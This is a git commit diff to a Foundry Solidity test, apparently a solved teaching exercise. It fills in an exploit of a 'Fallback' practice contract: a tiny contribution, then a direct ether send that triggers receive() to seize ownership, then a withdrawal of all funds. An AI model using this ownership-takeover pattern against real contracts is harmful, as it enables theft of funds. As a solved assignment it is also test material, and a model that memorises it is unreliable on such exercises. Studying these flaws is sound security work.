b873da762417266d108dd6376033ab3cd7fed26a
root <root@sam.eslam>
2025-04-11 20:05:51 +0200

    solved assignment 11

--- test/Assignment11.sol
+++ test/Assignment11.sol
@@ -18,10 +18,16 @@ contract FallbackTest is Test {
         vm.startPrank(student);
         
         // Contribute a small amount (less than 0.001 ether) to the contract
+        fallbackContract.contribute{value: 0.0005 ether}(
+        
+        );
 
         // Send ether to the contract trigger receive() and become the owner
+        address(fallbackContract).call{value: 0.0001 ether}("");
+        
 
         // Withdraw all funds
+        fallbackContract.withdraw();
 
         vm.stopPrank();
     }
